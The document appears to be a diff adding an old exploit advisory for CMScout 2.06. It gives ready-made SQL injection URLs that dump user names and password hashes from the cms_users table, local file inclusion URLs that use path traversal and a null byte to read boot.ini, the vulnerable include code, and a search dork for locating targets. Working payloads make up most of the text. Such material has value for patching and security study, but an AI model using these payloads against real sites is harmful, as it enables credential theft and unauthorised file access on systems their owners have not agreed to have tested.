@@ -1,0 +1,73 @@
+#############################################################################################
+[+] CMScout 2.06 Remote SQL Injection/Local File Inclusion
+[+] Discovered By SirGod
+[+] Visit : www.mortal-team.org
+[+] Visit : www.h4cky0u.org
+[+] Greetz : All my friends
+#############################################################################################
+
+[+] Script homepage : http://www.cmscout.co.za/
+[+] Dork : Powered by CMScout (c)2005 CMScout Group
+
+[+] Remote SQL Injection
+
+
+-------------------------------------------------------------------------------
+1)
+
+- You must be logged in as normal user.Add a download and go to :
+
+ Example :
+
+  http://[target]/[path]/index.php?page=mythings&cat=downloads&action=edit&id=null union all select 1,2,3,4,concat_ws(0x3a,uname,passwd),6,7,8,9,10,11 from cms_users--
+
+
+--------------------------------------------------------------------------------
+2)
+
+- You must be logged in as administrator .
+
+ Example :
+
+  http://[target]/[path]/admin.php?page=users&subpage=users_view&id=null union all select 1,2,concat_ws(0x3a,uname,passwd),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40 from cms_users--
+
+---------------------------------------------------------------------------------
+
+[+] Local File Inclusion
+
+---------------------------------------------------------------------------------
+1)
+
+- Vulnerable code in admin.php :
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+require_once ("{$bit}includes/error_handling.php");
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Example :
+
+http://[target]/[path]/admin.php?bit=../../../../../boot.ini%00
+
+----------------------------------------------------------------------------------
+2)
+
+- Vunerable code in index.php :
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+require_once ("{$bit}includes/error_handling.php");
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Example :
+
+http://[target]/[path]/index.php?bit=../../../../boot.ini%00
+
+----------------------------------------------------------------------------------
+
+
+#############################################################################################
+
+# milw0rm.com [2008-12-30]
